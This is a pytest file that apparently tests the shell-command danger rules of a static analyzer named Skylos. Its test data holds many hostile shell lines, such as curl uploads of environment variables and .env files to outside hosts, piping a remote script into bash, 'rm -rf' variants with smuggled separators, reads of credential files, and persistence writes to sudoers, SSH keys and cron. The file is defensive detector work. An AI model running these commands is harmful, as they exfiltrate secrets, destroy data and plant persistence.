from __future__ import annotations

import json
from pathlib import Path

import pytest

from skylos.analyzer import analyze
from skylos.security.command_guard import scan_shell_command
from skylos.visitors.languages.shell import scan_shell_file
from skylos.visitors.languages.shell.danger import scan_danger


def _scan_shell_findings(
    tmp_path: Path, code: str, filename: str = "deploy.sh"
) -> list[dict]:
    file_path = tmp_path / filename
    file_path.write_text(code, encoding="utf-8")
    return scan_shell_file(str(file_path), {})[7]


def _rule_ids(findings: list[dict]) -> set[str]:
    return {finding["rule_id"] for finding in findings}


def test_eval_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cmd="$1"
eval "$cmd"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_source_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
plugin="$1"
source "$plugin"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_shell_c_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
task="$1"
sh -c "$task"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_sudo_shell_c_with_positional_arg_flags_command_injection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
task="$1"
sudo -u app bash -c "$task"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_basename_does_not_sanitize_shell_commands(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cmd="$(basename -- "$1")"
eval "$cmd"
""",
    )

    assert "SKY-D212" in _rule_ids(findings)


def test_curl_with_read_url_flags_ssrf(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
read -r url
curl -fsSL "$url"
""",
    )

    assert "SKY-D216" in _rule_ids(findings)


def test_printenv_piped_to_curl_upload_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
printenv | curl -s -X POST https://env.debug.tools/capture -d @-
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_printenv_piped_to_curl_literal_data_not_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
printenv | curl -s -X POST https://env.debug.tools/capture -d skylos-demo
""",
    )

    assert "SKY-D327" not in _rule_ids(findings)


def test_printenv_piped_to_localhost_curl_not_external_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
printenv | curl -s -X POST http://localhost:3000/capture -d @-
""",
    )

    assert "SKY-D327" not in _rule_ids(findings)


def test_secret_env_sent_with_curl_data_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -s -X POST https://env.debug.tools/capture -d "$OPENAI_API_KEY"
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_curl_upload_dotenv_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -s https://paste.rs -d @.env
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_pip_extra_index_url_flags_package_registry_override(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
pip install --extra-index-url https://pypi.internal.corp.dev -r requirements.txt
""",
    )

    assert "SKY-D337" in _rule_ids(findings)


def test_npm_config_set_registry_flags_registry_and_persistent_mutation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npm config set registry https://registry.npm-packages.io
""",
    )

    ids = _rule_ids(findings)
    assert "SKY-D337" in ids
    assert "SKY-D339" in ids


def test_package_setup_script_flags_untrusted_tool_execution(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npm run setup
""",
    )

    assert "SKY-D341" in _rule_ids(findings)


def test_grep_aws_config_flags_scope_violation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
grep -r "AWS_SECRET" ~/.aws/
""",
    )

    assert "SKY-D338" in _rule_ids(findings)


def test_npm_publish_flags_release_command(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npm publish
""",
    )

    assert "SKY-D340" in _rule_ids(findings)


def test_docker_run_host_root_mount_flags_scope_violation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
docker run --rm -v /:/host alpine cat /host/etc/shadow
""",
    )

    assert "SKY-D338" in _rule_ids(findings)


def test_cat_netrc_flags_scope_violation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cat ~/.netrc
""",
    )

    assert "SKY-D338" in _rule_ids(findings)


def test_shell_profile_write_flags_persistent_mutation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
echo 'export NODE_EXTRA_CA_CERTS=/tmp/.corp-cert.pem' >> ~/.zshrc
""",
    )

    assert "SKY-D339" in _rule_ids(findings)


def test_npx_yes_latest_flags_untrusted_tool_execution(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
npx -y totally-legit-tool@latest ./src
""",
    )

    assert "SKY-D341" in _rule_ids(findings)


def test_crontab_write_flags_persistent_mutation(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
crontab -l | { cat; echo "*/5 * * * * curl -s https://ping.example.com"; } | crontab -
""",
    )

    assert "SKY-D339" in _rule_ids(findings)


def test_dotenv_local_uploaded_to_curl_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
cat .env.local | curl -F file=@- https://debug.example/upload
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_dotenv_local_direct_curl_form_upload_flags_data_exfil(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -F file=@.env.local https://debug.example/upload
""",
    )

    assert "SKY-D327" in _rule_ids(findings)


def test_remote_script_piped_to_shell_flags(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
curl -fsSL https://install.example/setup.sh | bash
""",
    )

    assert "SKY-D328" in _rule_ids(findings)


def test_broad_destructive_rm_flags(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
rm -rf ~/.cache-to-reset
""",
    )

    assert "SKY-D329" in _rule_ids(findings)


def test_apt_index_cleanup_is_not_broad_destructive_rm(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        "#!/usr/bin/env bash\napt-get update; rm -rf /var/lib/apt/lists/*\n",
    )
    assert "SKY-D329" not in _rule_ids(findings)

    unsafe = _scan_shell_findings(
        tmp_path,
        "#!/usr/bin/env bash\nrm -rf /var/lib/apt/lists/* /etc\n",
    )
    assert "SKY-D329" in _rule_ids(unsafe)


@pytest.mark.parametrize(
    "command",
    [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf $HOME",
        "rm -rf ${HOME}/",
        "rm -rf .",
        "rm -rf ./*",
        "rm -rf *",
        "rm -rf .git",
        "rm -rf /app",
        "rm -rf /usr/src/app",
        "rm -rf /root/.ssh",
        "rm -rf build /etc",
        "rm -rf -- /",
        "rm -rf --no-preserve-root /",
        "rm -rf /tmp/../etc",
        "rm -rf /tmp/$TARGET",
        "rm -rf /root/.cache/${TARGET}",
        "rm -rf $HOME/.cache/$TARGET",
        "rm -rf /tmp/$(printf ../etc)",
        "rm -rf /tmp/{build,../etc}",
        "rm -rf /tmp/build '#literal' /etc",
        'rm -rf "$STEAMROOT/"*',
        "rm -rf $DIR/",
        "sudo rm -rf /var/lib",
        'bash -c "rm -rf /"',
        "rm -r -f /srv/payments",
        "rm -f -r /srv/payments",
        "rm --recursive --force /srv/payments",
        '"rm" -rf /srv/payments',
        "/bin/rm -Rf /srv/payments",
        "sh -c 'rm -r -f /srv/payments'",
        'rm -rf /tmp/"a;b" /srv/payments',
        r"rm -rf /tmp/a\;b /srv/payments",
        'rm -rf /tmp/"a|b" /srv/payments',
        'rm -rf /tmp/"a&b" /srv/payments',
        'rm -rf /tmp/build ";" /srv/payments',
        "rm -rf /tmp/build \\\n /srv/payments",
        "rm -rf /tmp/..\\\n/etc",
        "env MODE=manual rm -r -f /srv/payments",
        "sudo -u root rm --recursive --force /srv/payments",
        "env -S 'rm -r -f /srv/payments'",
        "xargs -n 1 rm -rf /srv/payments",
        r"find /tmp -exec rm -rf /srv/payments \;",
        "rm -rf /tmp/build#literal /srv/payments",
        "rm -rf /tmp/build # comment \\\nrm -rf /srv/payments",
        "sh -c \"bash -xc 'rm -r -f /srv/payments'\"",
        r"echo '/tmp/foo\' ; rm -rf /srv/payments",
        r"echo '/tmp/foo\' && rm -rf /srv/payments",
        "echo ok & rm -rf /srv/payments",
        'echo "$(rm -rf /srv/payments)"',
        "echo `rm -rf /srv/payments`",
        'echo "`rm -rf /srv/payments`"',
        "{ rm -rf /srv/payments; }",
        "rm -rf /tmp/build 2>&1 /srv/payments",
        "exec -a benign rm -rf /srv/payments",
        "xargs --max-args 1 rm -rf /srv/payments",
        "xargs --max-procs 2 rm -rf /srv/payments",
        "env --split-string='rm -rf /srv/payments'",
        r"find /tmp -exec echo '{}' \; -exec rm -rf /srv/payments \;",
        "busybox rm -rf /srv/payments",
        "toybox rm -rf /srv/payments",
        "./helper rm -rf /srv/payments",
        "./printf rm -r -f /srv/payments",
        "/opt/custom/echo rm -r -f /srv/payments",
        "sudo -ualice rm -rf /srv/payments",
        "sudo -gdevelopers rm -rf /srv/payments",
        "sudo -pvalue rm -rf /srv/payments",
    ],
)
def test_broad_rm_targets_flag(command):
    assert "SKY-D329" in {risk.rule_id for risk in scan_shell_command(command)}


@pytest.mark.parametrize(
    "command",
    [
        "pip install -r requirements.txt && rm -rf /root/.cache/pip",
        "rm -rf /root/.cache",
        "rm -rf ~/.cache/pip",
        "rm -rf $HOME/.cache/pip ~/.npm",
        "apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*",
        "rm -rf /var/cache/apk/* /var/cache/apt/archives/*.deb",
        "rm -rf /tmp/* /var/tmp/*",
        "rm -rf /tmp/build > /dev/null",
        "rm -rf /tmp/build # /etc is only a comment",
        "rm -rf /usr/local/share/.cache/yarn",
        'rm -rf "${BUILD_DIR:?}"/*',
        "rm -rf build dist",
        "rm -r -f /root/.cache/pip",
        "rm --recursive --force /var/cache/apt/archives/*.deb",
        '"rm" -rf /tmp/"a;b"',
        "sh -c 'rm -r -f /root/.cache/pip'",
        'rm -rf /tmp/build ";"',
        "printf '%s' 'rm -rf /srv/payments'",
        "echo rm -rf /srv/payments",
        'printf "%s" rm -rf /srv/payments',
        "printf '%s' sh -c 'rm -rf /srv/payments'",
        "rm -rf /tmp/build # && rm -rf /srv/payments",
        "sudo -u root env MODE=manual rm --recursive --force /root/.cache/pip",
        "rm -- -rf /srv/payments",
        "sh -c \"bash -xc 'rm -r -f /root/.cache/pip'\"",
        "echo '$(rm -rf /srv/payments)'",
        "echo '`rm -rf /srv/payments`'",
        r'echo "\$(rm -rf /srv/payments)"',
        r'echo "\`rm -rf /srv/payments\`"',
        'echo "{ rm -rf /srv/payments; }"',
        "command -v rm -r -f /srv/payments",
        "env --help rm -r -f /srv/payments",
        "sudo -l rm -r -f /srv/payments",
        "exec -a rm printf '%s' -r -f /srv/payments",
        "sh -- -c 'rm -r -f /srv/payments'",
        "exec -la rm printf '%s' -r -f /srv/payments",
        "sudo -nu rm printf '%s' -r -f /srv/payments",
    ],
)
def test_cache_and_temp_cleanup_is_not_broad_rm(command):
    assert "SKY-D329" not in {risk.rule_id for risk in scan_shell_command(command)}


def test_deep_shell_nesting_does_not_invent_destructive_evidence():
    import shlex

    safe = "printf hello"
    unsafe = "rm -rf /srv/payments"
    quoted_unsafe = '"rm" -rf /srv/payments'
    for _ in range(10):
        safe = "sh -c " + shlex.quote(safe)
        unsafe = "sh -c " + shlex.quote(unsafe)
        quoted_unsafe = "sh -c " + shlex.quote(quoted_unsafe)
    assert "SKY-D329" not in {risk.rule_id for risk in scan_shell_command(safe)}
    assert "SKY-D329" in {risk.rule_id for risk in scan_shell_command(unsafe)}
    assert "SKY-D329" in {risk.rule_id for risk in scan_shell_command(quoted_unsafe)}


@pytest.mark.parametrize("terminator", ["# ignore this", "", "    # comment"])
def test_comment_or_blank_line_ends_pending_continuation(tmp_path, terminator):
    source = "#!/bin/sh\necho \\\n" + terminator + "\nrm -rf /srv/payments\n"
    findings = _scan_shell_findings(tmp_path, source)
    assert [
        (f["rule_id"], f["line"]) for f in findings if f["rule_id"] == "SKY-D329"
    ] == [("SKY-D329", 4)]


def test_uninterrupted_continuation_keeps_printed_argv_inert(tmp_path):
    source = "#!/bin/sh\necho \\\n    \\\nrm -rf /srv/payments\n"
    assert "SKY-D329" not in _rule_ids(_scan_shell_findings(tmp_path, source))


def test_comment_ended_continuation_keeps_cache_cleanup_bounded(tmp_path):
    source = "#!/bin/sh\necho \\\n# ignore this\nrm -rf /root/.cache/pip\n"
    assert "SKY-D329" not in _rule_ids(_scan_shell_findings(tmp_path, source))


def test_curl_fixed_host_with_tainted_path_is_not_ssrf(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
artifact="$1"
curl -fsSL "https://downloads.example.com/releases/$artifact"
""",
    )

    assert "SKY-D216" not in _rule_ids(findings)


def test_file_sink_with_positional_arg_flags_path_traversal(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
backup_name="$1"
cat "/srv/backups/$backup_name"
""",
    )

    assert "SKY-D215" in _rule_ids(findings)


def test_here_string_is_not_a_filesystem_redirection(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """#!/usr/bin/env bash
address="$1"
IFS=. read -r -a octets <<<"${address}"
""",
    )

    assert "SKY-D215" not in _rule_ids(findings)


def test_real_file_redirections_still_flag_path_traversal(tmp_path):
    statements = ('cat < "$1"', 'printf data > "$1"', 'printf data >> "$1"')
    for index, statement in enumerate(statements):
        findings = _scan_shell_findings(
            tmp_path,
            f"#!/usr/bin/env bash\n{statement}\n",
            filename=f"redirect-{index}.sh",
        )
        assert "SKY-D215" in _rule_ids(findings), statement


def test_heredoc_body_is_skipped_but_later_file_redirection_is_checked(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """#!/usr/bin/env bash
cat <<'TEXT'
cat "$1"
TEXT
cat < "$1"
""",
    )

    traversal_lines = [
        finding["line"] for finding in findings if finding["rule_id"] == "SKY-D215"
    ]
    assert traversal_lines == [5]


def test_basename_sanitized_file_path_is_safe(tmp_path):
    findings = _scan_shell_findings(
        tmp_path,
        """
#!/usr/bin/env bash
backup_name="$(basename -- "$1")"
cat "/srv/backups/$backup_name"
""",
    )

    assert "SKY-D215" not in _rule_ids(findings)


def test_analyzer_discovers_shell_scripts(tmp_path):
    script = tmp_path / "deploy.sh"
    script.write_text(
        """
#!/usr/bin/env bash
cmd="$1"
eval "$cmd"
""",
        encoding="utf-8",
    )

    result = json.loads(
        analyze(str(tmp_path), enable_danger=True, conf=0, grep_verify=False)
    )

    assert result["analysis_summary"]["languages"] == {"Shell": 1}
    assert "SKY-D212" in _rule_ids(result["danger"])


def test_function_positional_args_from_constant_call_sites_are_not_ssrf():
    # agent-pr-bench real-10: download() is only called with URLs the script
    # itself defines, so its "$1" is not user input.
    source = (
        "#!/usr/bin/env bash\n"
        'WIKI_URL="https://huggingface.co/datasets/x/resolve/main/wiki.jsonl.gz"\n'
        "download() {\n"
        '    local url="$1"\n'
        '    local output="$2"\n'
        '    curl -L --fail -o "$output" "$url"\n'
        '    wget -O "$output" "$url"\n'
        "}\n"
        'download "$WIKI_URL" wiki.jsonl.gz\n'
    )
    assert [
        f for f in scan_danger("data.sh", source) if f["rule_id"] == "SKY-D216"
    ] == []


def test_function_positional_args_from_script_arguments_stay_tainted():
    source = '#!/usr/bin/env bash\nfetch() {\n    curl "$1"\n}\nfetch "$1"\n'
    lines = [
        f["line"] for f in scan_danger("fetch.sh", source) if f["rule_id"] == "SKY-D216"
    ]
    assert lines == [3]


def test_uncalled_function_positional_args_stay_tainted():
    # Library scripts are sourced by other code: callers are unknown.
    source = 'fetch() {\n    curl "$1"\n}\n'
    lines = [
        f["line"] for f in scan_danger("lib.sh", source) if f["rule_id"] == "SKY-D216"
    ]
    assert lines == [2]


def _rule_ids_for(
    command: str, *, in_project: bool = False, home: bool = False
) -> set[str]:
    # in_project / home: what a GitHub Actions caller vouches for (the step
    # starts in the workspace / HOME is the runner's own).
    kwargs = {}
    if in_project:
        kwargs["cwd_in_project"] = True
    if home:
        kwargs["home_is_default"] = True
    return {risk.rule_id for risk in scan_shell_command(command, **kwargs)}


@pytest.mark.parametrize(
    "command",
    [
        # mozilla/pontoon backend.yml: a .env file written from a template.
        (
            "sed -e 's#^DATABASE_URL=.*#DATABASE_URL=postgres://localhost/db#' "
            "docker/config/server.env.template > .env"
        ),
        "cat config/env.template >> .env",
        "grep -v '^#' env.example >.env",
        "sed s/a/b/ template 2> .env",
        # Routine CI and Docker credential setup is a write, not a read.
        "ssh-keyscan github.com >> ~/.ssh/known_hosts",
        'echo "$DEPLOY_KEY" > ~/.ssh/id_rsa',
        'echo "//registry.npmjs.org/:_authToken=$NPM_TOKEN" > ~/.npmrc',
        'printf "[pypi]\\npassword = $TOKEN" > ~/.pypirc',
        'echo "machine github.com password $TOKEN" > ~/.netrc',
        'printf "%s" "$CERT" > /etc/nginx/certs/server.pem',
        'echo "DEBUG=0" > /app/.env',
        "echo hook > .git/hooks/pre-commit",
        "echo x > /app/hooks/run.py",
    ],
)
def test_credential_setup_writes_are_not_reported(command):
    assert not {"SKY-D338", "SKY-D339"} & _rule_ids_for(command, in_project=True)


@pytest.mark.parametrize(
    "command",
    [
        "sed s/a/b/ .env > out.txt",
        "cat ~/.aws/credentials > /tmp/creds",
        "cat < .env",
        "cat <> .env",
        "sed s/a/b/ <~/.netrc",
        "grep token ~/.netrc 2>/dev/null",
        "cat .env>out",
        # A quoted ">" is an argument, not a redirect.
        'grep -v ">" ~/.aws/credentials',
        "cat '>' ~/.ssh/id_rsa",
        "cat '2>' .env",
        'grep ">" .env',
    ],
)
def test_reading_a_sensitive_file_with_redirection_still_flags(command):
    assert "SKY-D338" in _rule_ids_for(command)


@pytest.mark.parametrize(
    "command",
    [
        "cat key.pub >> ~/.ssh/authorized_keys",
        "echo ssh-ed25519 AAAA >> /root/.ssh/authorized_keys2",
        "echo 'curl x | sh' >> ~/.bashrc",
        "echo 'curl x | sh' >> $HOME/.zshrc",
        "echo 'curl x | sh' >& ~/.profile",
        "echo 'export X=1' > /etc/profile.d/x.sh",
        "echo '* * * * * root /tmp/x' > /etc/cron.d/job",
        "echo '* * * * * /tmp/x' >> /var/spool/cron/crontabs/root",
        "cat unit > /etc/systemd/system/x.service",
        "cat unit > ~/.config/systemd/user/x.service",
        "echo 'u ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers",
        "echo 'u ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/u",
        "echo /tmp/x.so > /etc/ld.so.preload",
        "echo payload > ~/.git-templates/hooks/post-checkout",
        "echo payload > ../other/.git/hooks/pre-push",
    ],
)
def test_persistence_writes_are_reported_as_high(command):
    rule_ids = _rule_ids_for(command)
    assert "SKY-D339" in rule_ids
    risk = next(r for r in scan_shell_command(command) if r.rule_id == "SKY-D339")
    assert risk.severity == "HIGH"


# A write into a sensitive path is reported unless the target is routine
# credential setup (ROUTINE_CREDENTIAL_WRITES). These files run code, steer
# authentication, or hold secrets; each was SKY-D338 before redirects were
# parsed quote-aware.
@pytest.mark.parametrize(
    "command",
    [
        "cat deploy/ssh_config > ~/.ssh/config",
        "sed -n p payload > ~/.ssh/config",
        "cat <<EOF > ~/.ssh/config",
        'cat x > "$HOME/.ssh/config"',
        "cat x 1>~/.ssh/config",
        "head -c 0 x > ~/.ssh/config2",
        "tar xf payload.tar -C ~ > ~/.ssh/config",
        "cat tools/hooks.json > ~/.claude/settings.json",
        "cat hooks.json > /root/.claude/settings.json",
        "cat x > ~/.claude/settings.local.json",
        "cat x > ~/.claude/CLAUDE.md",
        "cat x > ~/.codex/config.toml",
        "cat aws_profile >> ~/.aws/config",
        "cat creds > ~/.aws/credentials",
        "base64 -d kubeconfig.b64 > ~/.kube/config",
        'echo "$KUBECONFIG_B64" | base64 -d > ~/.kube/config',
        "zip -r out.zip . > ~/.kube/config",
        "cat x > ~/.docker/config.json",
        "cat x > ~/.config/gh/hosts.yml",
        "cat x > /run/secrets/token",
        "cat x > .envrc",
        "cat payload > ~/.ssh/authorized_keys.d/key",
        "cat key.pub >> ~/.ssh/authorized_keys~",
        # Near misses of the routine-setup allowlist stay reported.
        "cat x > ~/.ssh/known_hosts/../config",
        "cat x > ~/.ssh/./../.ssh/config",
        "cat key > ~/.ssh/id_$KEY_TYPE",
        "cat x > .npmrc",
        "cat x > ~/.env",
        "cat x > /app/.env",
        'cat x > "$APP_DIR/.env"',
        'cat ca > "$CERT_DIR/$NAME.pem"',
        "cat x > ~/.ssh/deploy.key",
        # ~/.npmrc can run code (node-options, script-shell) and swap the registry.
        "cat x > ~/.npmrc",
        "sed s/TOKEN/x/ npmrc.tpl > ~/.npmrc",
        # Certificates written into a trust store.
        "cat x > /etc/ssl/cert.pem",
        "base64 -d ca.b64 > /etc/ssl/certs/corp.pem",
        "cat x > /usr/lib/python3/site-packages/certifi/cacert.pem",
        "cat x > ~/.local/lib/python3.12/site-packages/certifi/cacert.pem",
        "cat x > venv/lib/python3.12/site-packages/certifi/cacert.pem",
        "cat x > /opt/app/tls.pem",
        "cat x > /tmp/../etc/ssl/cert.pem",
        "cat x > ../../../../../../etc/ssl/cert.pem",
    ],
)
def test_sensitive_writes_outside_routine_setup_are_reported(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True)


# Bash expands globs in redirect targets, so a pattern that can name a
# persistence file is a persistence write.
@pytest.mark.parametrize(
    "command",
    [
        "cat key.pub >> ~/.ssh/authorized_ke*",
        "cat key.pub >> ~/.ssh/authorized_key?",
        "cat key.pub >> ~/.ssh/[a]uthorized_keys",
        "cat key.pub >> ~/.ssh/[[:alpha:]]uthorized_keys",
        "cat key.pub >> ~/.ssh/[!x]uthorized_keys",
        "cat key.pub >> /root/.ssh/auth*",
        "echo ssh-ed25519 AAAA >> ~/.ssh/authorized_ke*",
        "cat x > ~/.ssh/*",
        "echo 'curl x | sh' >> ~/.bash*",
        "echo 'curl x | sh' >> $HOME/.z?hrc",
        "cat x > /etc/sudoer?",
        "cat x > /et?/crontab",
        "cat x > /etc/cr?n.d/job",
        "cat unit > /etc/sys*/system/x.service",
        "cat unit > ~/.config/system?/user/x.service",
        "echo payload > ~/.git-templates/hoo*/post-checkout",
        # Redundant "/", "." and ".." do not hide a persistence path.
        "cat x >> /etc//cron.d/job",
        "cat x > /etc/./sudoers",
        "cat x > /tmp/../etc/sudoers",
        # sshd runs ~/.ssh/rc and loads ~/.ssh/environment at every login.
        "cat payload >> ~/.ssh/rc",
        "cat payload > ~/.ssh/environment",
        "echo 'curl x | sh' > /root/.ssh/rc",
        "echo LD_PRELOAD=/tmp/x.so >> ~/.ssh/environment",
        "cat payload >> ~/.ssh/r?",
    ],
)
def test_glob_and_login_persistence_writes_are_reported_as_high(command):
    rule_ids = _rule_ids_for(command)
    assert "SKY-D339" in rule_ids
    risk = next(r for r in scan_shell_command(command) if r.rule_id == "SKY-D339")
    assert risk.severity == "HIGH"


# A glob never matches the routine-setup allowlist: in a sensitive directory
# it is reported like the directory's other files.
@pytest.mark.parametrize(
    "command",
    [
        "cat x > ~/.ssh/c*",
        "cat x > ~/.ssh/known_host?",
        "cat key > ~/.ssh/id_*",
        "cat x > ~/.aws/c?nfig",
        "cat x > ~/.kube/conf*",
        "cat ca > /etc/ssl/certs/*.pem",
    ],
)
def test_glob_writes_into_sensitive_paths_are_reported(command):
    assert "SKY-D338" in _rule_ids_for(command)


@pytest.mark.parametrize(
    "command",
    [
        "cat known >> ~/.ssh/known_hosts",
        "cat known >> ~/.ssh//known_hosts",
        "cat <<'EOF' >> ~/.ssh/known_hosts",
        "cat key > ~/.ssh/id_rsa",
        'base64 -d <<< "$DEPLOY_KEY" > ~/.ssh/id_ed25519',
        "cat key.pub > $HOME/.ssh/id_ed25519.pub",
        "cat key > /root/.ssh/id_rsa",
        "cat key > /home/runner/.ssh/id_rsa",
        "cat x > ~/.ssh/known_hosts",
        "cat netrc > ${HOME}/.netrc",
        "cat pypirc > /root/.pypirc",
        'echo "$HOME"; cat x > ~/.netrc',
        "cat template > ./.env",
        "cat template > config/.env",
        # Not sensitive file names at all.
        "cat x > ./certs/client.crt",
        "base64 -d ca.b64 > ca.cer",
        # Ordinary globs name no sensitive or persistence path.
        "cat a b > build/*.txt",
        "sed s/a/b/ in > out-*.json",
        "cat parts > *.log",
    ],
)
def test_routine_setup_and_plain_glob_writes_are_not_reported(command):
    rule_ids = _rule_ids_for(command, in_project=True, home=True)
    assert not {"SKY-D338", "SKY-D339"} & rule_ids


# Certificate writes are never routine: a CA bundle can sit anywhere
# (Homebrew, conda, mkcert, a relinked directory), as on main.
@pytest.mark.parametrize(
    "command",
    [
        "base64 -d cert.b64 > ca.pem",
        "cat x > certs/client.pem",
        "cat x > /tmp/ca.pem",
        "cat x > $HOME/.docker/ca.pem",
        "cat x > /root/client.pem",
        "cat x > /home/linuxbrew/.linuxbrew/etc/openssl@3/cert.pem",
        "cat x > ~/miniconda3/ssl/cert.pem",
        "cat x > ~/.local/share/mkcert/rootCA.pem",
        "cat x > ~/.mitmproxy/mitmproxy-ca.pem",
        "cat x > ~/.ssh/x.pem",
        "ln -s /etc/ssl /tmp/s; cat x > /tmp/s/cert.pem",
        "ln -sf /etc/ssl/cert.pem /tmp/ca.pem; cat x > /tmp/ca.pem",
        "ln -s /etc/ssl ~/s; cat x > ~/s/cert.pem",
        "cat x > /proc/self/root/etc/ssl/cert.pem",
    ],
)
def test_certificate_writes_are_reported(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True)


# A reader writing into a persistence file that is also sensitive keeps
# main's CRITICAL SKY-D338 beside the HIGH SKY-D339.
@pytest.mark.parametrize(
    "command",
    [
        "cat key >> ~/.ssh/authorized_keys",
        "cat deploy.pub >> ~/.ssh/authorized_keys",
        "cat x > ~/.ssh/rc",
        "cat x > ~/.ssh/environment",
        "base64 -d k.b64 >> /root/.ssh/authorized_keys2",
        "cat key.pub >> ~/.ssh/authorized_ke*",
        'sed -n p key >> "$HOME"/.ssh/authorized_keys',
    ],
)
def test_reader_writes_into_sensitive_persistence_files_stay_critical(command):
    risks = {r.rule_id: r.severity for r in scan_shell_command(command)}
    assert risks.get("SKY-D338") == "CRITICAL"
    assert risks.get("SKY-D339") == "HIGH"


@pytest.mark.parametrize(
    "command",
    [
        # A here-string's command substitution runs and reads the file.
        'cat <<< "$(cat ~/.ssh/id_rsa)"',
        'base64 <<< "$(cat ~/.aws/credentials)"',
        "grep x <<< $(cat ~/.aws/credentials)",
        # Reads stay reported whatever the write target is.
        "cat ~/.aws/credentials > ~/.npmrc",
        "cat .env.example > .env",
        "cat ~/.ssh/id_rsa >> ~/.ssh/authorized_keys",
    ],
)
def test_sensitive_reads_beside_redirects_still_flag(command):
    assert "SKY-D338" in _rule_ids_for(command)


# A relative .env is a project file only if the caller says the script starts
# in the project and nothing in the script may change directory, run code the
# scanner cannot see, or relink paths, wherever it appears.
@pytest.mark.parametrize(
    "command",
    [
        "cd /etc && cat x > .env",
        "cd /etc; cat x > .env",
        "pushd /tmp && cat x > .env",
        "pushd /tmp >/dev/null; cat x > .env; popd",
        "popd; cat x > .env",
        "chdir /tmp; cat x > .env",
        "builtin cd / && cat x > .env",
        "command cd / && cat x > .env",
        "(cd /; cat x > .env)",
        "{ cd /; cat x > .env; }",
        "if cd /; then cat x > .env; fi",
        "if ! cd /; then exit 1; fi; cat x > .env",
        'cd /tmp\necho "$X" | base64 -d > .env\n',
        "go() { cd /; }; go; cat x > .env",
        "c''d /tmp; cat x > .env",
        # The change may come later in the text and still run first.
        "for d in a b; do cat x > .env; cd ..; done",
        "f() { cat x > .env; }; cd /; f",
        "function f { cat x > .env; }; cd /; f",
        "cat x > .env\ncd /",
        "cat x > .env # cd /",
        # Hidden or indirect commands.
        'eval "cd /etc"; cat x > .env',
        "true && eval cd\\ /etc && cat x > .env",
        "exec 3<&0; cat x > .env",
        ". ./setup.sh && cat template > .env",
        "builtin . ./ci/enter-dir.sh; cat x > .env",
        "command . ./setup.sh; cat x > .env",
        "source env.sh; sed s/a/b/ template > .env",
        "C=cd; $C /tmp; cat x > .env",
        "$(echo c)d /tmp; cat x > .env",
        "`echo cd` /tmp; cat x > .env",
        '"$TOOL" /tmp; cat x > .env',
        "ln -s /etc conf; cat x > conf/.env",
        "env -C /tmp sh; cat x > .env",
        "env --chdir=/tmp true; cat x > .env",
        # PowerShell location cmdlets and aliases.
        "Set-Location ..; cat x > .env",
        "sl ..; cat x > .env",
        "Push-Location ..; cat x > .env",
        "Pop-Location; cat x > .env",
    ],
)
def test_relative_env_writes_after_possible_directory_changes_are_reported(command):
    assert "SKY-D338" in _rule_ids_for(command, in_project=True)


@pytest.mark.parametrize(
    "command",
    [
        "cat template > .env",
        "sed s/a/b/ docker/config/server.env.template > .env",
        "cat x > sub/.env",
    ],
)
def test_relative_env_writes_without_a_known_working_directory_are_reported(
    command,
):
